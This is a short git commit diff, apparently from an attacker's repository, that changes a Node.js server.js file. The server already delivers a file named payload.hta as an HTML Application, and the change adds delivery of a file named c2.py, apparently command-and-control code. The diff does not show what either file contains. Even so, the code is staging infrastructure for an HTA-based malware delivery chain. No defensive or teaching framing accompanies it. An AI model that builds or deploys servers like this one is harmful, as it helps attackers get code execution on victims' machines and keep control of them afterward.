99b3c544d81e48ccd7eab6c39c8ab86fec823d3b
sableaks <ghostyhax3r@gmail.com>
2026-08-12 18:54:23 +0300

    Update server.js

--- server.js
+++ server.js
@@ -2,6 +2,20 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const PORT = process.env.PORT || 8080;
+
 const htaContent = fs.readFileSync(path.join(__dirname, 'payload.hta'), 'utf8');
-const server = http.createServer((req, res) => { if (req.url.endsWith('.hta')) { res.writeHead(200, {'Content-Type': 'application/hta'}); res.end(htaContent); } else { res.writeHead(200, {'Content-Type': 'text/html'}); res.end('OK'); } });
+const c2Content = fs.readFileSync(path.join(__dirname, 'c2.py'), 'utf8');
+
+const server = http.createServer((req, res) => {
+    if (req.url.endsWith('.hta')) {
+        res.writeHead(200, {'Content-Type': 'application/hta'});
+        res.end(htaContent);
+    } else if (req.url.endsWith('.py')) {
+        res.writeHead(200, {'Content-Type': 'text/plain'});
+        res.end(c2Content);
+    } else {
+        res.writeHead(200, {'Content-Type': 'text/html'});
+        res.end('OK');
+    }
+});
 server.listen(PORT, () => console.log('Listening on ' + PORT));
